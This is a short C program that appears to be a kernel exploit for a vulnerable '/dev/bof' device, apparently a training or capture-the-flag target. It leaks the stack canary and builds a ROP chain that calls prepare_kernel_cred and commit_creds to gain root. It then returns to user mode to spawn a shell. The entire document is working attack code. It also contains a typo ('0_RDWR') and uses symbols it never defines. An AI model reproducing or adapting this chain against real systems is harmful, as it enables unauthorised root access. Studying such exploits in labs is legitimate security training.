int main() {

    size_t rop[30] = {0, };
    size_t *leak[3] = {0, };

    int i = 0;
    int fd;

    char *fake_stack = mmap((void *)0x5d000000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    fd = open("/dev/bof", 0_RDWR);

    read(fd, leak, sizeof(leak));

    printf("canary : 0x%016x\n", leak[1]);

    rop[i++] = 0x4141414141414141;
    rop[i++] = leak[1];  // canary
    rop[i++] = 0xffffffff818f062d; // pop rdi ; ret;
    rop[i++] = init_task_ptr;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = 0xffffffff810e63c3; // pop rcx ; ret;
    rop[i++] = nfsd_debug;
    rop[i++] = 0xffffffff818d65cf; // push rax; pop rdi ; add byte ptr [rcx], bh; ret;
    rop[i++] = commit_creds;
    rop[i++] = 0xffffffff82001698; // swapgs_restore_regs_and_return_to_usermode
    rop[i++] = 0x4141414141414141;
    rop[i++] = 0x4141414141414141;
    rop[i++] = (uint64_t)shell;  // rip
    rop[i++] = 0x33;             // cs
    rop[i++] = 0x200;            // rflags
    rop[i++] = (uint64_t)(fake_stack + 0x800); // rsp
    rop[i++] = 0x2b;             // ss

    write(fd, rop, sizeof(rop));

    abort();

}